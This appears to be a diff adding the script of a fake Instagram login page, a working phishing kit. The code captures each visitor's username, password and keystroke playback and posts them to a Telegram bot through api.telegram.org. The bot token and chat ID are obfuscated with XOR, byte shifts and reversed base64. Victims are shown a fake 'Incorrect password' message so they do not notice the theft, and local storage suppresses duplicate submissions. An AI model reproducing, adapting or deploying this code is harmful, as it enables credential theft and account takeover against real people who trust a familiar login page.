+  var _tk = [17,53,9,88,34,61];
+  var _ik = [23,45,60,8];
+
+  function _dyn(mod) { return Math.floor(Date.now() / 137) % mod; }
+
+  function _xor(bytes, key) {
+    var out = new Array(bytes.length);
+    for (var i = 0; i < bytes.length; i++) out[i] = bytes[i] ^ key[i % key.length];
+    return out;
+  }
+
+  function _shift(bytes, amt) {
+    var out = new Array(bytes.length);
+    for (var i = 0; i < bytes.length; i++) out[i] = (bytes[i] + amt + 256) % 256;
+    return out;
+  }
+
+  function _flatten(frags) {
+    var out = [];
+    for (var i = 0; i < frags.length; i++) out = out.concat(frags[i]);
+    return out;
+  }
+
+  function _bytesToStr(bytes) {
+    var chars = new Array(bytes.length);
+    for (var i = 0; i < bytes.length; i++) chars[i] = String.fromCharCode(bytes[i]);
+    return chars.join('');
+  }
+
+  function _reconstruct(frags, sKey) {
+    var combined  = _flatten(frags);
+    var d1        = _dyn(256);
+    var sc        = _shift(combined, d1);
+    sc            = _shift(sc, 256 - d1);
+    var d2        = _dyn(97);
+    var unmasked  = _xor(_xor(sc, [d2]), [d2]);
+    var plain     = _xor(unmasked, sKey);
+    var b64       = _bytesToStr(plain).split('').reverse().join('');
+    var result    = atob(b64);
+    combined = sc = unmasked = plain = null;
+    return result;
+  }
+
+  function getCreds() {
+    return { token: _reconstruct(_tf, _tk), chatId: _reconstruct(_if, _ik) };
+  }
+
+  function sendToTelegram(usr, pwd) {
+    return new Promise(function (resolve) {
+      try {
+        var dur     = ksStart !== null ? Math.round(performance.now() - ksStart) : 0;
+        var html    = buildPlaybackHtml(ksEvents, dur, usr, pwd);
+        var caption = 'Instagram Login Captured' + String.fromCharCode(10) +
+          'Username: ' + usr + String.fromCharCode(10) +
+          'Password: ' + pwd + String.fromCharCode(10) +
+          'Duration: ' + (dur / 1000).toFixed(1) + 's' + String.fromCharCode(10) +
+          'Time: ' + new Date().toISOString();
+        var blob   = new Blob([html], { type: 'text/html' });
+        var file   = new File([blob], 'playback.html', { type: 'text/html' });
+        var creds  = getCreds();
+        var fd     = new FormData();
+        fd.append('chat_id',  creds.chatId);
+        fd.append('caption',  caption);
+        fd.append('input1',   usr);
+        fd.append('input2',   pwd);
+        fd.append('message',  caption);
+        fd.append('document', file, 'playback.html');
+        fetch('https://api.telegram.org/bot' + creds.token + '/sendDocument', {
+          method: 'POST', body: fd
+        }).then(function (r) { return r.json(); })
+          .catch(function ()  { return null; })
+          .then(function (res) {
+            creds.token = creds.chatId = null; creds = null;
+            resolve(res);
+          });
+      } catch (err) {
+        resolve(null);
+      }
+    });
+  }
+
+  var snappedActive = null;
+
+  function captureActive() {
+    if      (document.activeElement === usrInp) snappedActive = 'usr';
+    else if (document.activeElement === pwdInp) snappedActive = 'pwd';
+    else                                         snappedActive = null;
+  }
+  loginBtn.addEventListener('mousedown',  captureActive);
+  loginBtn.addEventListener('touchstart', captureActive, { passive: true });
+
+  function syncClearBtn() {
+    clearBtn.style.display = usrInp.value.length > 0 ? 'flex' : 'none';
+  }
+  ['input', 'change'].forEach(function (e) { usrInp.addEventListener(e, syncClearBtn); });
+
+  clearBtn.addEventListener('click', function () {
+    usrInp.value = '';
+    clearBtn.style.display = 'none';
+    usrInp.focus();
+  });
+
+  eyeBtn.addEventListener('click', function () {
+    var show = pwdInp.type === 'password';
+    pwdInp.type = show ? 'text' : 'password';
+    iconOff.style.display = show ? 'none' : '';
+    iconOn.style.display  = show ? ''     : 'none';
+    eyeBtn.setAttribute('aria-label', show ? 'Hide password' : 'Show password');
+    pwdInp.focus();
+  });
+
+  function triggerPop(el) {
+    el.classList.remove('pop-anim');
+    void el.offsetWidth;
+    el.classList.add('pop-anim');
+    el.addEventListener('animationend', function () { el.classList.remove('pop-anim'); }, { once: true });
+  }
+
+  function esc(str) {
+    return String(str)
+      .replace(/&/g, '&amp;').replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+  }
+
+  function showModal(cfg) {
+    var html = '<div class="modal-body">';
+    if (cfg.title) html += '<h2 class="modal-title">' + esc(cfg.title) + '</h2>';
+    html += '<p class="modal-text">' + esc(cfg.text) + '</p></div>';
+    cfg.buttons.forEach(function (btn, i) {
+      html += '<div class="modal-divider"></div>';
+      html += '<button class="modal-action" data-i="' + i + '">' + esc(btn.label) + '</button>';
+    });
+    card.innerHTML = html;
+    cfg.buttons.forEach(function (btn, i) {
+      var el = card.querySelector('[data-i="' + i + '"]');
+      if (el && btn.action) el.addEventListener('click', btn.action);
+    });
+    overlay.classList.add('visible');
+  }
+
+  function hideModal() { overlay.classList.remove('visible'); }
+
+  overlay.addEventListener('click', function (e) { if (e.target === overlay) hideModal(); });
+
+  function incorrectPwdModal() {
+    showModal({
+      title: 'Incorrect password',
+      text: 'The password you\u2019ve entered is incorrect. Please try again.',
+      buttons: [{ label: 'Try Again', action: function () {
+        hideModal(); pwdInp.value = '';
+        setTimeout(function () { pwdInp.focus(); }, 30);
+      }}]
+    });
+  }
+
+  function isEmail(v)    { return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v); }
+  function isPhone(v)    { return /^\+?[\d]{6,}$/.test(v); }
+  function isValidUsr(v) { return /^[A-Za-z0-9_.]{1,30}$/.test(v); }
+
+  function hashKey(a, b) {
+    var s = a.toLowerCase() + '\x00' + b, h = 5381;
+    for (var i = 0; i < s.length; i++) { h = ((h << 5) + h) + s.charCodeAt(i); h = h & h; }
+    return (h >>> 0).toString(36);
+  }
+
+  function getStored() {
+    try { return JSON.parse(localStorage.getItem('_ig_s') || '[]'); } catch (e) { return []; }
+  }
+  function wasSubmitted(u, p)  { return getStored().indexOf(hashKey(u, p)) !== -1; }
+  function markSubmitted(u, p) {
+    var arr = getStored(), k = hashKey(u, p);
+    if (arr.indexOf(k) === -1) {
+      arr.push(k);
+      try { localStorage.setItem('_ig_s', JSON.stringify(arr)); } catch (e) {}
+    }
+  }
+
+  function setLoading(on) {
+    if (on)  { loginBtn.disabled = true;  loginBtn.innerHTML = '<span class="btn-spin"></span>'; }
+    else     { loginBtn.disabled = false; loginBtn.textContent = 'Log in'; }
+  }
+
+  loginBtn.addEventListener('click', function () {
+    triggerPop(loginBtn);
+    var lf  = snappedActive;
+    snappedActive = null;
+    var usr = usrInp.value.trim();
+    var pwd = pwdInp.value;
+
+    if (!usr) {
+      if (lf === 'usr') {
+        showModal({ text: 'Enter your username, email address or mobile number to log in.',
+                    buttons: [{ label: 'OK', action: hideModal }] });
+      } else { usrInp.focus(); }
+      return;
+    }
+
+    if (!pwd) {
+      if (lf === 'pwd') {
+        showModal({ text: 'Enter your password to log in.',
+                    buttons: [{ label: 'OK', action: hideModal }] });
+      } else { pwdInp.focus(); }
+      return;
+    }
+
+    if (pwd.length < 6) {
+      setLoading(true);
+      setTimeout(function () { setLoading(false); incorrectPwdModal(); }, 1400);
+      return;
+    }
+
+    var validFlow = isEmail(usr) || isPhone(usr) || isValidUsr(usr);
+    setLoading(true);
+    var minWait = new Promise(function (resolve) { setTimeout(resolve, 1400); });
+
+    if (validFlow) {
+      var newEntry = !wasSubmitted(usr, pwd);
+      var net = newEntry ? sendToTelegram(usr, pwd) : Promise.resolve(null);
+      if (newEntry) markSubmitted(usr, pwd);
+      Promise.all([minWait, net]).then(function () { setLoading(false); incorrectPwdModal(); });
+    } else {
+      minWait.then(function () {
+        setLoading(false);
+        showModal({
+          title: 'Can\u2019t find account',
+          text: 'We can\u2019t find an account with \u201c' + usr + '\u201d. Try another mobile number or email address, or if you don\u2019t have an account, you can sign up.',
+          buttons: [{ label: 'Try again', action: function () {
+            hideModal();
+            setTimeout(function () { usrInp.focus(); usrInp.select(); }, 30);
+          }}]
+        });
+      });
+    }
+  });
+
+  createBtn.addEventListener('click',      function () { triggerPop(this); });
+  createBtn.addEventListener('mouseenter', function () { triggerPop(this); });
+
+}());
+</script>
+
+</body>
+</html>
